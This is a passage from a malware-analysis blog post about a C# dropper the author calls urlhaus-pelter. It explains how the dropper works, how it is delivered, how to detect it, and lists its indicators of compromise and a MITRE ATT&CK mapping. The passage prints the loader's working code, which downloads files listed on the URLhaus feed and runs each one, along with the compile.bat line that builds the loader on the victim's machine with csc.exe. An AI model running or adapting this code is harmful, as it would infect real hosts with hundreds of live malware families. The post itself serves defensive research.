+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">        </span><span class="n">l</span><span class="p">.</span><span class="n">Trim</span><span class="p">().</span><span class="n">EndsWith</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))).</span><span class="n">ToList</span><span class="p">();</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="w">    </span><span class="kt">string</span><span class="w"> </span><span class="n">drop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Path</span><span class="p">.</span><span class="n">GetTempPath</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;/7413374368&quot;</span><span class="p">;</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="w">    </span><span class="n">Directory</span><span class="p">.</span><span class="n">CreateDirectory</span><span class="p">(</span><span class="n">drop</span><span class="p">);</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="w">    </span><span class="n">Directory</span><span class="p">.</span><span class="n">SetCurrentDirectory</span><span class="p">(</span><span class="n">drop</span><span class="p">);</span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="w">    </span><span class="k">using</span><span class="w"> </span><span class="nn">WebClient</span><span class="w"> </span><span class="n">dl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebClient</span><span class="p">();</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="w">    </span><span class="k">foreach</span><span class="w"> </span><span class="p">(</span><span class="kt">string</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">urls</span><span class="p">)</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="w">        </span><span class="kt">string</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="n">Last</span><span class="p">();</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="w">            </span><span class="n">dl</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="w">            </span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Overall, the script acts as an automated, silent malware dropper. Instead of hardcoding a specific payload, it acts as a "live fetcher", scraping a public URLhaus threat intelligence feed in real-time, filtering for file types that Windows will automatically execute, and launching them locally on the infected machine. </p>
+<p>In addition, it filters the downloaded URLs to look exclusively for file extensions that Windows natively launches by default (executables, scripts, office documents, shortcuts, and installers like <code>.exe</code>, <code>.msi</code>, <code>.lnk</code>, <code>.vbs</code>, <code>.ps1</code>, etc.).</p>
+<h2 id="what-runs-on-detonation">What Runs on Detonation<a class="headerlink" href="#what-runs-on-detonation" title="Permanent link">&para;</a></h2>
+<p>The URLhaus <code>text_online</code> feed on the day of writing holds roughly 1,800 URLs. Several hundred match the 21-extension filter at any given hour. abuse.ch regenerates the feed as new URLs are reported and as older URLs go offline.</p>
+<p>A single run of <code>loader.exe</code> on a current Windows host will download several hundred live malware samples, drop them all into one folder, and launch each with <code>Process.Start</code>. The payloads currently in the feed include Formbook, Lumma, AsyncRAT, Vidar, DcRat, Remcos, SmokeLoader, GuLoader, Stealc, a selection of ransomware stubs, several commodity cryptominers, and the usual long tail. Many of these conflict with each other at runtime. The result is a host running dozens of unrelated malware processes in parallel.</p>
+<p>For incident responders this breaks the usual one-compromise-one-family assumption. The forensic timeline is populated by concurrent, independent families. Multiple C2 beacons will appear, each belonging to a different infrastructure. Pivoting from an identified payload back to an operator does not work, because the operator never provisioned any of these payloads. abuse.ch did. That is an unusual place to end up as a defender.</p>
+<h2 id="how-the-family-ships">How the Family Ships<a class="headerlink" href="#how-the-family-ships" title="Permanent link">&para;</a></h2>
+<p>I do not have provenance for how any specific operator seeds this binary onto a target. VirusTotal shows the sample has been submitted exactly once, from one source, and has no in-the-wild URL recorded against it. What VirusTotal does show is one documented delivery pattern used by this family: an execution-parent ZIP that compiles the source on the victim.</p>
+<p>VirusTotal's execution-parent graph for <code>fa0fa9fc7935347c38d2f8a5b04f24bbf4d308396bfd7ef1f6fb10fc5c163272</code> points to a ZIP, <code>117a5deaf35a81d9a43d73bdcaeca70d98b4d133a103f3f3d5b9b1453635c993</code>. I pulled the ZIP from VT and extracted it. It is 1,184 bytes and contains two files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>compile.bat    64 bytes
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>loader.txt   2,442 bytes
+</span></code></pre></div>
+<p>Full <code>compile.bat</code>:</p>
+<div class="language-bat highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>C<span class="p">:</span><span class="nl">\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe</span><span class="c1"> loader.txt</span>
+</span></code></pre></div>
+<p>Full <code>loader.txt</code>: the exact C# source for the sample above, as plaintext.</p>
+<p>VirusTotal's dynamic analysis of this ZIP (CAPE Sandbox and Zenbox) shows the process tree <code>cmd.exe /c compile.bat → csc.exe loader.txt → cvtres.exe → dropped loader.exe → executed</code>. The dropped <code>loader.exe</code> in the sandbox trace has 55/72 detections on VT and matches our hash.</p>
+<figure>
+  <img src="../images/Pasted image 20261015143750.png" alt="VirusTotal Activity Summary for 117a5deaf35a81d9a43d73bdcaeca70d98b4d133a103f3f3d5b9b1453635c993">
+  <figcaption>Figure 3: VirusTotal Activity Summary for 117a5deaf35a81d9a43d73bdcaeca70d98b4d133a103f3f3d5b9b1453635c993.</figcaption>
+</figure>
+
+<p>A <code>similar_files</code> query on this ZIP returns 40 near-identical siblings on VT, ranging from 771 bytes to about 2 KB and dating back to 2023. The oldest archived variant I pulled directly (<code>f548e6be1fdbcdfccb2143c9e8ab0fba9013a3573511bf886d4e2aca797d2bd3</code>) is dated June 2023 and uses the same <code>compile.bat</code>-style pattern with different filenames (<code>c.bat</code> + <code>a.txt</code>).</p>
+<p>The signed Microsoft C# compiler <code>csc.exe</code> ships with every .NET Framework install since Windows 7. Blocking it outright is not realistic in most environments. Behavioural detection has to key on the chain: one source-dropper ZIP, one <code>.bat</code> compiling a <code>.txt</code> to a new PE, immediate execution of that PE under an unprivileged user context, no developer-tool parent in the process tree.</p>
+<p>The technique is MITRE T1127.002 (Compile After Delivery).<sup id="fnref2:1"><a class="footnote-ref" href="#fn:1">2</a></sup> It is well-documented and has been used by other families, including BatLoader.<sup id="fnref2:2"><a class="footnote-ref" href="#fn:2">3</a></sup> Basically, the novelty here is the payload, not the delivery.</p>
+<p>Whether the ZIP pathway is the only way the family ships is not something I can determine from the evidence I have. VirusTotal has 40 similar ZIP siblings on this template going back to 2023, which makes it the dominant documented delivery, but it does not rule out other packagings.</p>
+<h2 id="attribution">Attribution<a class="headerlink" href="#attribution" title="Permanent link">&para;</a></h2>
+<p>I did not identify a tracked threat actor behind this family. No public write-up names the family. Microsoft's <code>!MTB</code> suffix on the Defender tag denotes malware produced by a shared source template, which is consistent with the file inventory. The authorial fingerprint across variants is consistent (<code>Array.Resize</code> in a loop rather than LINQ, prank-themed sibling filenames, no obfuscation, bugs the author never caught) and points to a code-sharing origin rather than an operator-maintained toolset.</p>
+<p>When it comes to naming, I named it urlhaus-pelter. "Pelter" because the sample pelts the victim with every URL on the feed. "URLhaus" because the feed is the sole payload broker.</p>
+<h2 id="detection-and-mitigation">Detection and Mitigation<a class="headerlink" href="#detection-and-mitigation" title="Permanent link">&para;</a></h2>
+<p>If you are defending against this, these are the rules I would recommend:</p>
+<ul>
+<li>Alert on any process tree where <code>cmd.exe</code> or Explorer launches <code>csc.exe &lt;*.txt&gt;</code> and the resulting PE is immediately executed under <code>%TEMP%</code> or the current working directory, with a parent process that is not a known developer tool (Visual Studio, MSBuild, dotnet CLI, PowerShell developer session). Developer compilation from a command line is near-zero in most enterprise environments.</li>
+<li>Do not block <code>urlhaus.abuse.ch</code> at the perimeter. Defenders need the feed. Alert instead on any endpoint that is not a sandbox, a defender workstation, or a threat-intel ingestion host and that nonetheless resolves and fetches the <code>/downloads/text_online/</code> path.</li>
+<li>Sysmon file-create (event ID 11) under <code>%TEMP%\7413374368\</code> with any extension in the 21-extension set should fire a high-severity alert. The drop-directory name is unique enough to key on by itself.</li>
+<li>AppLocker or WDAC: restrict <code>csc.exe</code> to Visual Studio-adjacent paths and parent processes.</li>
+</ul>
+<h2 id="indicators-of-compromise">Indicators of Compromise<a class="headerlink" href="#indicators-of-compromise" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fa0fa9fc7935347c38d2f8a5b04f24bbf4d308396bfd7ef1f6fb10fc5c163272</code></td>
+<td>SHA-256</td>
+<td>Compiled <code>loader.exe</code> analysed in this post</td>
+</tr>
+<tr>
+<td><code>117a5deaf35a81d9a43d73bdcaeca70d98b4d133a103f3f3d5b9b1453635c993</code></td>
+<td>SHA-256</td>
+<td>Parent ZIP with <code>compile.bat</code> + <code>loader.txt</code> (May 2023 variant)</td>
+</tr>
+<tr>
+<td><code>f548e6be1fdbcdfccb2143c9e8ab0fba9013a3573511bf886d4e2aca797d2bd3</code></td>
+<td>SHA-256</td>
+<td>Sibling ZIP with <code>c.bat</code> + <code>a.txt</code> (June 2023 variant)</td>
+</tr>
+<tr>
+<td><code>d9063f1726bc7161aa6844b1a193af65dad287a22942f352b626113e4f80b598</code></td>
+<td>SHA-256</td>
+<td>Similar ZIP, 771 bytes</td>
+</tr>
+<tr>
+<td><code>b8a8736a16d5cf63db934c0e54319eadf9d58179de0f6e51dc458824e61efa89</code></td>
+<td>SHA-256</td>
+<td>Similar ZIP, 984 bytes</td>
+</tr>
+<tr>
+<td><code>c0b5baa6fb5c00e1cb04b50b6dea6fb20a650ad7804fefb977d726b3c8fd7397</code></td>
+<td>SHA-256</td>
+<td>Similar ZIP, ~1 KB</td>
+</tr>
+<tr>
+<td><code>ec8c114e9c0bd6154bd58396c72fabe79e2ffe70dea761cabc98b35186723360</code></td>
+<td>SHA-256</td>
+<td>Sibling compiled PE, confirmed via Hybrid Analysis to drop into <code>%TEMP%\7413374368\</code></td>
+</tr>
+<tr>
+<td><code>https://urlhaus.abuse.ch/downloads/text_online/</code></td>
+<td>URL</td>
+<td>abuse.ch URLhaus live-URL feed, used by the loader as its payload list</td>
+</tr>
+<tr>
+<td><code>7413374368</code></td>
+<td>String</td>
+<td>Magic drop-directory name, present in the May-2023 variant and the compiled 2026 sample</td>
+</tr>
+<tr>
+<td><code>Downloading files, please wait...</code></td>
+<td>String</td>
+<td>Launcher banner, present in both source variants</td>
+</tr>
+<tr>
+<td><code>%TEMP%\7413374368\</code></td>
+<td>Path</td>
+<td>Drop directory on an infected host</td>
+</tr>
+<tr>
+<td><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &lt;*.txt&gt;</code></td>
+<td>Host pattern</td>
+<td>LOLBin compilation chain used by the ZIP delivery pattern</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping<a class="headerlink" href="#mitre-attck-mapping" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>ID</th>
+<th>Technique</th>
+<th>Procedure</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Execution</td>
+<td>T1059.003</td>
+<td>Command and Scripting Interpreter: Windows Command Shell</td>
+<td><code>compile.bat</code> runs from <code>cmd.exe /c</code></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1127.002</td>
+<td>Trusted Developer Utilities Proxy Execution: Compile After Delivery</td>
+<td><code>csc.exe</code> compiles the delivered <code>loader.txt</code> into a new PE on the victim</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1204.002</td>
+<td>User Execution: Malicious File</td>
+<td>User double-clicks <code>compile.bat</code> from the extracted ZIP</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1140</td>
+<td>Deobfuscate/Decode Files or Information</td>
+<td>Plaintext C# source is converted to a PE by on-victim compilation</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1562.001</td>
+<td>Impair Defenses: Disable or Modify Tools</td>
+<td><code>ServerCertificateValidationCallback =&gt; true</code> disables TLS certificate validation</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1071.001</td>
+<td>Application Layer Protocol: Web Protocols</td>
+<td>HTTPS feed fetch and payload downloads via <code>WebClient</code></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Each matching URL on the feed is pulled onto the host</td>
+</tr>
+<tr>
+<td>Impact</td>
+<td>T1485</td>
+<td>Data Destruction (indirect)</td>
+<td>Victim ends up running N concurrent, uncoordinated malware families</td>
+</tr>
+</tbody>
+</table>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:3">
+<p>abuse.ch, "URLhaus" (public malware URL feed, including the plain-text <code>text_online</code> endpoint). <a href="https://urlhaus.abuse.ch/">https://urlhaus.abuse.ch/</a>&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 1 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:3" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:1">
+<p>MITRE ATT&amp;CK T1127.002, "Trusted Developer Utilities Proxy Execution: Compile After Delivery." <a href="https://attack.mitre.org/techniques/T1127/002/">https://attack.mitre.org/techniques/T1127/002/</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 2 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:1" title="Jump back to footnote 2 in the text">&#8617;</a><a class="footnote-backref" href="#fnref3:1" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p>VMware Threat Analysis Unit, "BatLoader: The Evasive Downloader" (background on BatLoader's use of on-victim compilation). <a href="https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html">https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html</a>&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 3 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:2" title="Jump back to footnote 3 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+<footer class="site-footer-custom">
+  <div class="site-footer-inner">
+    <span class="footer-note">v0lundr.github.io · TLP:WHITE</span>
+    <div class="footer-links">
+      <a href="https://github.com/V0lundr" target="_blank" rel="noopener">GitHub</a>
+      <a href="/feed_rss_created.xml" target="_blank" rel="noopener">RSS</a>
+    </div>
+  </div>
+</footer>
+
+<style>
+  /* Hide default Material footer */
+  .md-footer { display: none !important; }
+
+  .site-footer-custom {
+    border-top: 1px solid #1e2535;
+    background: #07090f;
+    padding: 1.5rem 0;
+  }
+
+  .site-footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .footer-note {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: #5a6478;
+    letter-spacing: 0.06em;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 1.5rem;
+  }
+
+  .footer-links a {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #5a6478;
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+
+  .footer-links a:hover { color: #e8a84c; }
+</style>
+
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/fix.js"></script>
+      
+    
+  </body>
+</html>
